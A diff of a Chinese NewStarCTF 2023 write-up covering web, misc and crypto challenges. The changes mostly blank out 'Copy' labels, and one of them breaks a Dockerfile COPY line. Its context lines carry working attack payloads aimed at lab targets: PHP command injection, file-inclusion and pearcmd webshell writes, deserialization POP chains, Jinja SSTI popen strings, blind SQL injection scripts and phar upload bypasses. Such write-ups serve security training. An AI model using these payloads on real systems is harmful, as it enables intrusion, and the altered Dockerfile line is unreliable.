@@ -23,7 +23,7 @@ mermaid = true
 
 robots.txt 内容如下
 
-Copy
+ 
 
 ```
 PART ONE: flag{r0bots_1s_s0_us3ful
@@ -31,7 +31,7 @@ PART ONE: flag{r0bots_1s_s0_us3ful
 
 www.zip/index.php 内容如下
 
-Copy
+ 
 
 ```
 <?php
@@ -41,7 +41,7 @@ echo "<h1>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏�
 
 即可得到 flag 如下
 
-Copy
+ 
 
 ```
 flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
@@ -55,7 +55,7 @@ flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
 
 通过蚁剑一把梭即可得到 flag（文件在 /fllll4g）。
 
-Copy
+ 
 
 ```
 flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
@@ -65,7 +65,7 @@ flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
 
 #### **0x00 GET**
 
-Copy
+ 
 
 ```
 请使用 GET方式 来给 ctf 参数传入任意值来通过这关
@@ -73,7 +73,7 @@ Copy
 
 通过 param 传入 ctf 参数即可，如下
 
-Copy
+ 
 
 ```
 http://node4.buuoj.cn:29844/?ctf=123
@@ -81,7 +81,7 @@ http://node4.buuoj.cn:29844/?ctf=123
 
 #### **0x01 POST**
 
-Copy
+ 
 
 ```
 很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 
@@ -90,7 +90,7 @@ Copy
 
 查看源代码可以发现
 
-Copy
+ 
 
 ```
 <!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
@@ -98,7 +98,7 @@ Copy
 
 通过 base64 解密可以得到 Secret 值为 `n3wst4rCTF2023g00000d` ，通过 body 传入即可。
 
-Copy
+ 
 
 ```
 secret=n3wst4rCTF2023g00000d
@@ -106,7 +106,7 @@ secret=n3wst4rCTF2023g00000d
 
 #### **0x02 Cookie**
 
-Copy
+ 
 
 ```
 很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关
@@ -114,7 +114,7 @@ Copy
 
 通过设置 Cookie 如下
 
-Copy
+ 
 
 ```
 Cookie: power=ctfer
@@ -122,7 +122,7 @@ Cookie: power=ctfer
 
 #### **0x03 User-Agent**
 
-Copy
+ 
 
 ```
 你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！
@@ -130,7 +130,7 @@ Copy
 
 通过设置 User-Agent 如下
 
-Copy
+ 
 
 ```
 User-Agent: NewStarCTF2023
@@ -138,7 +138,7 @@ User-Agent: NewStarCTF2023
 
 #### **0x04 Referer**
 
-Copy
+ 
 
 ```
 希望你是从 newstarctf.com 访问到这个关卡的
@@ -146,7 +146,7 @@ Copy
 
 通过设置 Referer 如下
 
-Copy
+ 
 
 ```
 Referer: newstarctf.com
@@ -154,7 +154,7 @@ Referer: newstarctf.com
 
 #### **0x05 X-Real-Ip**
 
-Copy
+ 
 
 ```
 最后一关了！只有 本地用户 可以通过这一关
@@ -162,7 +162,7 @@ Copy
 
 通过设置 X-Real-Ip 如下
 
-Copy
+ 
 
 ```
 X-Real-Ip: 127.0.0.1
@@ -174,7 +174,7 @@ X-Real-Ip: 127.0.0.1
 
 通过题目得知需要从 Flask 中的报错中寻找答案，网页回显如下
 
-Copy
+ 
 
 ```
 give me number1 and number2,i will help you to add
@@ -182,7 +182,7 @@ give me number1 and number2,i will help you to add
 
 通过输入字符串类型的值即可得到报错，Payload 如下
 
-Copy
+ 
 
 ```
 ?number1=a&number2=b
@@ -190,7 +190,7 @@ Copy
 
 得到回显后点击 `return "not ssti,flag in source code~"+str(int(num1)+int(num2))` 即可得到 flag ，不方便复制可以 F12 来复制。
 
-Copy
+ 
 
 ```
 flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
@@ -198,7 +198,7 @@ flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
 
 ### [Week 1]Begin of PHP
 
-Copy
+ 
 
 ```
 <?php
@@ -267,7 +267,7 @@ if($flag4){
 
 md5 绕过，可以通过数组进行绕过，Payload 如下
 
-Copy
+ 
 
 ```
 key1[]=1&key2[]=2
@@ -277,7 +277,7 @@ key1[]=1&key2[]=2
 
 md5 === sha1 绕过，同样可以通过数组进行绕过，Payload 如下（Level 5 中不允许 POST 的值出现任何数字或字母）
 
-Copy
+ 
 
 ```
 key3[]=@
@@ -287,7 +287,7 @@ key3[]=@
 
 strcmp 函数绕过，同样可以通过数组进行绕过，Payload 如下
 
-Copy
+ 
 
 ```
 key1[]=1&key2[]=2&key4[]=4
@@ -297,7 +297,7 @@ key1[]=1&key2[]=2&key4[]=4
 
 is_numeric 函数绕过，将 key5 设置为 2024a(任意字符) 即可，Payload 如下
 
-Copy
+ 
 
 ```
 key1[]=1&key2[]=2&key4[]=4&key5=2024a
@@ -309,7 +309,7 @@ key1[]=1&key2[]=2&key4[]=4&key5=2024a
 
 通过发现缺少了 flag5 变量，说明就需要通过以上方法来造出 flag5，又因为 POST 的值出现任何数字或字母，根据在 PHP 中，只要字符串不为空即为 `True` 的特性，故 Payload 如下
 
-Copy
+ 
 
 ```
 key3[]=@&flag5=@
@@ -319,7 +319,7 @@ key3[]=@&flag5=@
 
 ### [Week 1]R!C!E!
 
-Copy
+ 
 
 ```
 <?php
@@ -339,7 +339,7 @@ if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
 
 并且题目中还存在一个 password，该参数会进行 md5 加密并对比前 6 位需要与 `c4d038` 一致，可以通过写脚本进行爆破。
 
-Copy
+ 
 
 ```
 import hashlib
@@ -354,7 +354,7 @@ for i in range(0, 99999999):
 
 题目还对部分常见的恶意函数进行了过滤，但是可以通过 反引号 来执行 shell 命令，也可以通过 反斜杠 来进行绕过，Payload 如下
 
-Copy
+ 
 
 ```
 password=114514&e[v.a.l=echo `l\s /`;
@@ -362,7 +362,7 @@ password=114514&e[v.a.l=echo `l\s /`;
 
 可以得到回显如下
 
-Copy
+ 
 
 ```
 bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
@@ -370,7 +370,7 @@ bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.
 
 构造 Payload 如下即可得到 flag
 
-Copy
+ 
 
 ```
 password=114514&e[v.a.l=echo `tac /fl\ag`;
@@ -380,7 +380,7 @@ password=114514&e[v.a.l=echo `tac /fl\ag`;
 
 随意注册一个账号后登录会进入终端，但在 BurpSuite 中可以发现还有一个特别的请求如下
 
-Copy
+ 
 
 ```
 POST /passport/f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.php
@@ -388,7 +388,7 @@ POST /passport/f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.
 
 该请求的回显如下
 
-Copy
+ 
 
 ```
 <!-- 恭喜你找到flag -->
@@ -403,7 +403,7 @@ Copy
 
 从图中已知输入的密码会进行 md5 加密，通过编写 Python 脚本进行爆破，我这里爆破用的是 rockyou.txt ，可以在 Kali 中找到。
 
-Copy
+ 
 
 ```
 import requests
@@ -426,7 +426,7 @@ with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
 
 ### [Week 2]include 0。0
 
-Copy
+ 
 
 ```
 file=php://filter/read=convert.%2562ase64-encode/resource=flag.php
@@ -434,7 +434,7 @@ file=php://filter/read=convert.%2562ase64-encode/resource=flag.php
 
 ### [Week 2]Unserialize？
 
-Copy
+ 
 
 ```
 unser=O:4:"evil":1:{s:3:"cmd";s:35:"c\at /th1s_1s_fffflllll4444aaaggggg";}
@@ -444,7 +444,7 @@ unser=O:4:"evil":1:{s:3:"cmd";s:35:"c\at /th1s_1s_fffflllll4444aaaggggg";}
 
 #### .htaccess 绕过、`<?` 绕过
 
-Copy
+ 
 
 ```
 <FilesMatch "shell.jpg">
@@ -454,7 +454,7 @@ SetHandler application/x-httpd-php
 
 ### [Week 2]R!!C!!E!!
 
-Copy
+ 
 
 ```
 /bo0g1pop.php?star=eval(array_rand(array_flip(getallheaders())));
@@ -465,7 +465,7 @@ User-Agent: system("cat /flag");
 
 进入 Console
 
-Copy
+ 
 
 ```
 gameScore=999999999999999
@@ -475,7 +475,7 @@ gameScore=999999999999999
 
 ### [Week 2]ez_sql
 
-Copy
+ 
 
 ```
 $ python sqlmap.py -u http://ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables --dump-all
@@ -489,7 +489,7 @@ $ python sqlmap.py -u http://ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn
 
 打开页面源代码如下
 
-Copy
+ 
 
 ```
 <?php
@@ -512,7 +512,7 @@ Copy
 
 通过构造 payload 如下
 
-Copy
+ 
 
 ```
 file=phpinfo
@@ -528,7 +528,7 @@ register_argc_argv 告诉PHP是否声明了 `argv` 和 `argc` 变量，这些变
 
 通过构造 payload 如下
 
-Copy
+ 
 
 ```
 file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST[1])?>+./1.php
@@ -536,7 +536,7 @@ file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST[1])?>+./1.php
 
 可以得到回显如下
 
-Copy
+ 
 
 ```
 Successfully created default configuration file "/var/www/html/1.php"
@@ -544,7 +544,7 @@ Successfully created default configuration file "/var/www/html/1.php"
 
 通过访问 `1.php` ，并构造 payload 如下即可得到 flag。
 
-Copy
+ 
 
 ```
 1=system("cat /flag");
@@ -556,7 +556,7 @@ Copy
 
 过滤关键词：union、# ，发现回显只有 `id not exists` 还有 ID 正确时的输出，故尝试布尔注入，经测试 `select、or、where、ascii` 需要进行大小写绕过。
 
-Copy
+ 
 
 ```
 import requests
@@ -677,7 +677,7 @@ print(d)
 
 源代码
 
-Copy
+ 
 
 ```
 <?php
@@ -755,7 +755,7 @@ class WhiteGod{
 
 POP链如下
 
-Copy
+ 
 
 ```
 Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func, $vars)->CTF::end()->WhiteGod::__unset($var)
@@ -763,7 +763,7 @@ Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func
 
 构造 Payload 过程如下
 
-Copy
+ 
 
 ```
 <?php
@@ -872,7 +872,7 @@ echo urlencode(serialize($begin));
 
 通过查看 Network - Headers 可以发现 Pop 属性值为 `/secr3tofpop` ，通过访问可以得到回显如下
 
-Copy
+ 
 
 ```
 please give a name by get
@@ -880,7 +880,7 @@ please give a name by get
 
 通过构造 Payload 如下
 
-Copy
+ 
 
 ```
 name=123
@@ -888,7 +888,7 @@ name=123
 
 可以得到回显如下
 
-Copy
+ 
 
 ```
 Welcome to NewstarCTF 2023 123
@@ -896,7 +896,7 @@ Welcome to NewstarCTF 2023 123
 
 猜测应该是 Python 的 SSTI 注入，通过构造 Payload 如下
 
-Copy
+ 
 
 ```
 name={{7*7}}
@@ -904,7 +904,7 @@ name={{7*7}}
 
 得到回显如下
 
-Copy
+ 
 
 ```
 big hacker!get away from me!
@@ -912,7 +912,7 @@ big hacker!get away from me!
 
 尝试另外一种 Payload 如下
 
-Copy
+ 
 
 ```
 name=<div data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7' data-3='7'></div>
@@ -920,7 +920,7 @@ name=<div data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7'
 
 可以得到回显如下
 
-Copy
+ 
 
 ```
 Welcome to NewstarCTF 2023 49
@@ -930,7 +930,7 @@ Welcome to NewstarCTF 2023 49
 
 通过构造 Payload 如下
 
-Copy
+ 
 
 ```
 name=
@@ -940,7 +940,7 @@ name=
 
 可以输出所有的子类，被过滤的关键字可以通过 `|attr()` 进行绕过，由于直接使用 eval 无法使用 chr 函数，因此需要通过在里面多套一层 eval 来实现，由于已经存在单双引号了，所以就直接全用 chr 函数来实现注入吧，生成脚本如下
 
-Copy
+ 
 
 ```
 string = "__import__('os').popen('cat /flag').read()"
@@ -957,7 +957,7 @@ chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(1
 
 构造 Payload 如下
 
-Copy
+ 
 
 ```
 name=
@@ -971,7 +971,7 @@ name=
 
 源代码如下
 
-Copy
+ 
 
 ```
 <?php
@@ -1001,7 +1001,7 @@ if(isset($_POST['payload'])){
 
 由于引号没有进行绕过，所以可以通过引号进行关键字的绕过，构造 Payload 过程如下
 
-Copy
+ 
 
 ```
 <?php
@@ -1040,7 +1040,7 @@ echo serialize($pop);
 
 源代码中存在 `hint.txt` 内容如下
 
-Copy
+ 
 
 ```
 『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
@@ -1050,7 +1050,7 @@ Copy
 
 在 `routes/info.js` 可以发现该路由用于根据所给的 timestamp 输出该时间戳之后的所有内容。
 
-Copy
+ 
 
 ```
 async function getInfo(timestamp) {
@@ -1069,7 +1069,7 @@ minTimestamp 首先会从 `CONFIG` 中获取 `min_public_time` ，获取失败�
 
 在 `routes/submit.js` 中可以发现原型链污染点：
 
-Copy
+ 
 
 ```
 // L39
@@ -1097,7 +1097,7 @@ const result = await insert2db(merge(DEFAULT, data));
 
 构造 Payload 如下
 
-Copy
+ 
 
 ```
 {
@@ -1111,7 +1111,7 @@ Copy
 
 通过访问 `/info/0` 可以得到回显得到 flag 。
 
-Copy
+ 
 
 ```
 {
@@ -1135,7 +1135,7 @@ Copy
 
 这题考察的是 PHP 反序列化逃逸。
 
-Copy
+ 
 
 ```
 <?php
@@ -1162,7 +1162,7 @@ unserialize(waf(serialize(new GetFlag($_GET['key']))));
 
 可控的属性为 `key` ，并且可以通过 waf 中的替换来实现反序列化逃逸的效果。
 
-Copy
+ 
 
 ```
 $getFlag = new GetFlag('');
@@ -1174,7 +1174,7 @@ echo waf(serialize($getFlag)).'<br>';
 
 需要通过逃逸构造出 `";s:3:"cmd";s:4:"ls /";}` 共 24 个字符，又因为 bad 替换成 good 后即增加一位，因此需要循环 24 次 bad 来进行逃逸。
 
-Copy
+ 
 
 ```
 $getFlag = new GetFlag(str_repeat("bad", 24).'";s:3:"cmd";s:4:"ls /";}');
@@ -1186,7 +1186,7 @@ echo waf(serialize($getFlag)).'<br>';
 
 构造 Payload 如下
 
-Copy
+ 
 
 ```
 key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
@@ -1194,7 +1194,7 @@ key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:
 
 即可输出跟目录的内容，同理构造 Payload 如下
 
-Copy
+ 
 
 ```
 key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
@@ -1208,7 +1208,7 @@ key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadb
 
   GC 回收
 
-Copy
+ 
 
 ```
 <?php
@@ -1284,7 +1284,7 @@ throw new Exception("Nope");
 
   数组对象为 NULL 。
 
-Copy
+ 
 
 ```
 <?php
@@ -1309,13 +1309,13 @@ echo serialize($a);
 
 POP 链如下：
 
-Copy
+ 
 
 ```
 Start::__destruct()->Crypto::__toString()->Reverse::__get($var)->Pwn::__invoke()->Web::evil()
 ```
 
-Copy
+ 
 
 ```
 $p = new Pwn();
@@ -1336,7 +1336,7 @@ echo serialize($a);
 
 通过将第二个索引 `i:1` 修改为 `i:0` 即可出发 GC 回收机制，构造 Payload 如下
 
-Copy
+ 
 
 ```
 fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:0;i:0;}
@@ -1344,7 +1344,7 @@ fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse
 
 即可得到目录，再构造 Payload 如下即可得到 flag 。
 
-Copy
+ 
 
 ```
 fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;i:0;}
@@ -1352,7 +1352,7 @@ fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse
 
 ### [Week 4]midsql
 
-Copy
+ 
 
 ```
 $cmd = "select name, price from items where id = ".$_REQUEST["id"];
@@ -1364,7 +1364,7 @@ $result = $result[0];
 
 经过测试，空格、等号被绕过了，可以通过 `/**/` 和 `like` 进行绕过。
 
-Copy
+ 
 
 ```
 import time
@@ -1418,7 +1418,7 @@ time spend: 16.405414819717407
 
 可以得出数据库名为 `ctf` 。
 
-Copy
+ 
 
 ```
 params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{i},1))>{mid},sleep(1),1)#"}
@@ -1426,7 +1426,7 @@ params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name
 
 可以得出表名为 `items` 。
 
-Copy
+ 
 
 ```
 params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/table_name/**/like'items'),{i},1))>{mid},sleep(1),1)#"}
@@ -1434,7 +1434,7 @@ params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_nam
 
 可以得出字段名为 `id,name,price` 。
 
-Copy
+ 
 
 ```
 params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(1),1)#"}
@@ -1446,7 +1446,7 @@ params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,pr
 
 根据题目已知框架为 Flask ，通过 `admin manage` 已知开启了 Debug 模式，在该模式下修改 `app.py` 会立即加载，通过 Upload 上传新的 `app.py` 。
 
-Copy
+ 
 
 ```
 from flask import *
@@ -1471,7 +1471,7 @@ if __name__ == '__main__':
 
 上传后通过构造 Payload 获得 flag 。
 
-Copy
+ 
 
 ```
 1=cat /flag
@@ -1481,7 +1481,7 @@ Copy
 
 查看源代码可以发现提示 `class.php` ，通过查看可以得到源码如下。
 
-Copy
+ 
 
 ```
 <?php
@@ -1498,7 +1498,7 @@ class Flag{
 
 结合标题可以通过 Phar 反序列化来写入 WebShell ，经过随机上传发现存在文件类型检测。
 
-Copy
+ 
 
 ```
 <?php
@@ -1519,7 +1519,7 @@ $phar->stopBuffering();
 
 通过上传发现存在过滤 `!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)` ，可以通过 gzip 压缩进行绕过。
 
-Copy
+ 
 
 ```
 $ gzip -f 1.phar
@@ -1528,7 +1528,7 @@ $ mv 1.phar.gz 1.jpg
 
 修改好后进行上传得到回显如下。
 
-Copy
+ 
 
 ```
 Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
@@ -1536,7 +1536,7 @@ Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
 
 再通过构造 Payload 如下即可上传恶意 WebShell 。
 
-Copy
+ 
 
 ```
 // class.php
@@ -1545,7 +1545,7 @@ file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
 
 此时通过构造 Payload 如下即可获得 flag 。
 
-Copy
+ 
 
 ```
 // 1.php
@@ -1556,12 +1556,12 @@ Copy
 
 附件：Dockerfile
 
-Copy
+ 
 
 ```
 FROM vulhub/flask:1.1.1
 ENV FLAG=flag{not_here}
-COPY src/ /app
+  src/ /app
 RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
 CMD [ "/start.sh" ]
 EXPOSE 8080
@@ -1573,7 +1573,7 @@ EXPOSE 8080
 
 可以发现 `../` 被替换成了空，但是可以通过类似双写的方法进行绕过从而实现路径穿越，构造 Payload 如下。
 
-Copy
+ 
 
 ```
 /download?file=..././..././..././app/app.py
@@ -1581,7 +1581,7 @@ Copy
 
 可以得到 `app.py` 的源码如下。
 
-Copy
+ 
 
 ```
 import os
@@ -1658,13 +1658,13 @@ if __name__ == '__main__':
 
 通过分析 backdoor 函数可知需要进行 session 伪造来修改 `session['user']` ，通过源码可知 `secret_key` 位于 `config.py` 中，通过上述相同方法获取，回显如下。
 
-Copy
+ 
 
 ```
 secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
 ```
 
-Copy
+ 
 
 ```
 $ python .\flask_session_cookie_manager3.py decode -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
@@ -1674,7 +1674,7 @@ AoCqDY"
 
 成功 decode 后，还需要进行绕过，编写一个 Python 脚本如下。
 
-Copy
+ 
 
 ```
 import subprocess
@@ -1728,7 +1728,7 @@ y0U3_f14g_1s_h3re
 
 发现成功绕过并且获得 flag 文件名 `y0U3_f14g_1s_h3re` ，通过修改脚本如下即可得到 flag 。
 
-Copy
+ 
 
 ```
 payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='c' data-32='~' data-33='at' data-34='10' data-35='10' data-36='0' data-37='/y0U3_f14g_1s_h3re' data-38='))[' data-39='read'></div>'
@@ -1738,7 +1738,7 @@ payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb
 
 ### [Week 1]CyberChef's Secret
 
-Copy
+ 
 
 ```
 来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)
@@ -1749,7 +1749,7 @@ CyberChef 一把梭，flag 如下
 
 
 
-Copy
+ 
 
 ```
 flag{Base_15_S0_Easy_^_^}
@@ -1759,7 +1759,7 @@ flag{Base_15_S0_Easy_^_^}
 
 通过 zteg 可以得到 flag。
 
-Copy
+ 
 
 ```
 ┌──(kali㉿kali)-[~/Desktop]
@@ -1782,7 +1782,7 @@ b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo
 
 可以发现这是请求 flag 并且将 flag 以 base64 编码的形态输出，通过将值进行 base64 解码即可得到 flag。
 
-Copy
+ 
 
 ```
 flag{Wri35h4rk_1s_u53ful_b72a609537e6}
@@ -1802,7 +1802,7 @@ flag{Wri35h4rk_1s_u53ful_b72a609537e6}
 
 在压缩包注释中存在一串 base64 编码内容如下
 
-Copy
+ 
 
 ```
 SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==
@@ -1810,7 +1810,7 @@ SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBl
 
 解码内容如下
 
-Copy
+ 
 
 ```
 I like six-digit numbers because they are very concise and easy to remember.
@@ -1818,7 +1818,7 @@ I like six-digit numbers because they are very concise and easy to remember.
 
 说明密码应该为 6 个数字，用 ARCHPR 进行爆破即可得到密码为 `232311` ，解压后即可得到 flag
 
-Copy
+ 
 
 ```
 flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
@@ -1826,7 +1826,7 @@ flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
 
 ### [Week 1]空白格
 
-Copy
+ 
 
 ```
   
@@ -1838,7 +1838,7 @@ Copy
 
 通过在线工具即可得到 flag 如下
 
-Copy
+ 
 
 ```
 flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
@@ -1850,7 +1850,7 @@ flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
 
 ![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252Fxb8dtvA0iGfVA8P2hXtf%252F%25E9%259A%2590%25E7%25A7%2598%25E7%259A%2584%25E7%259C%25BC%25E7%259D%259B-1.png%3Falt%3Dmedia%26token%3D47ffcf4e-cb24-43cf-96d8-52b9fbe543e3&width=768&dpr=4&quality=100&sign=ade95233883cfca3e76025e1d66f531e3732a5bec818b48efb88fa946a85bcca)
 
-Copy
+ 
 
 ```
 flag{R0ck1ng_y0u_63b0dc13a591}
@@ -1866,7 +1866,7 @@ http://hi.pcmoe.net/buddha.html
 
 密文如下
 
-Copy
+ 
 
 ```
 ++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<<-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<<-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<<-.+++.>>>>.<<<<-------.+.>>>>>++.
@@ -1874,7 +1874,7 @@ Copy
 
 > https://www.splitbrain.org/services/ook
 
-Copy
+ 
 
 ```
 flag{Oiiaioooooiai#b7c0b1866fe58e12}
@@ -1884,7 +1884,7 @@ flag{Oiiaioooooiai#b7c0b1866fe58e12}
 
 密文如下
 
-Copy
+ 
 
 ```
 kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}
@@ -1892,7 +1892,7 @@ kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}
 
 > https://www.dcode.fr/caesar-cipher
 
-Copy
+ 
 
 ```
 flag{ca3s4r's_c1pher_i5_v4ry_3azy}
@@ -1902,7 +1902,7 @@ flag{ca3s4r's_c1pher_i5_v4ry_3azy}
 
 密文如下
 
-Copy
+ 
 
 ```
 fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
@@ -1910,13 +1910,13 @@ fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
 
 栅栏密码，使用 CyberChef 可以解出来
 
-Copy
+ 
 
 ```
 #recipe=Rail_Fence_Cipher_Decode(2,0)&input=ZmF7ZXJlaWd0ZXBhbmV0NjY4MH1sZ3JvZHJuX2hfbGl0eCM4ZmMz
 ```
 
-Copy
+ 
 
 ```
 flag{reordering_the_plaintext#686f8c03}
@@ -1926,7 +1926,7 @@ flag{reordering_the_plaintext#686f8c03}
 
 密文如下
 
-Copy
+ 
 
 ```
 pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
@@ -1936,7 +1936,7 @@ pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
 
 维吉尼亚密码解密，将密文丢进上述链接中，并设置
 
-Copy
+ 
 
 ```
 Knowing a plaintext word: flag{
@@ -1944,7 +1944,7 @@ Knowing a plaintext word: flag{
 
 可以发现当 Key 前三位为 `KFC` 时存在 `flag{` ，故尝试让 Key 就等于 `KFC` ，发现就是 flag。
 
-Copy
+ 
 
 ```
 flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
@@ -1954,7 +1954,7 @@ flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
 
 密文如下
 
-Copy
+ 
 
 ```
 part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=
@@ -1964,7 +1964,7 @@ part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S<R-C`Q9F8S87T`
 
 前两个用 CyberChef 可以一把梭，结果如下。
 
-Copy
+ 
 
 ```
 part 1 of flag: flag{dazzling_encoding#4e0ad4
@@ -1977,7 +1977,7 @@ part 2 of flag: f0ca08d1e1d0f10c0c7afe422fea7
 
 解密后可以得到第三部分
 
-Copy
+ 
 
 ```
 part 3 of flag: c55192c992036ef623372601ff3a}
@@ -1989,7 +1989,7 @@ part 3 of flag: c55192c992036ef623372601ff3a}
 
 题目中的 e 很大，说明 d 就会很小，通过 Wiener 攻击来解出 d。
 
-Copy
+ 
 
 ```
 from Crypto.Util.number import long_to_bytes
@@ -2011,7 +2011,7 @@ print(long_to_bytes(m))
 
 题目描述中给出 hint ，通过 factordb 分解 n ，可以得到以下数组。
 
-Copy
+ 
 
 ```
 array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
@@ -2019,7 +2019,7 @@ array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 279498511
 
 分解所得均为素数，通过计算出 phi 即可得出结果。
 
-Copy
+ 
 
 ```
 import gmpy2
@@ -2044,7 +2044,7 @@ print(long_to_bytes(m))
 
 ### [Week 1]babyxor
 
-Copy
+ 
 
 ```
 from secret import *
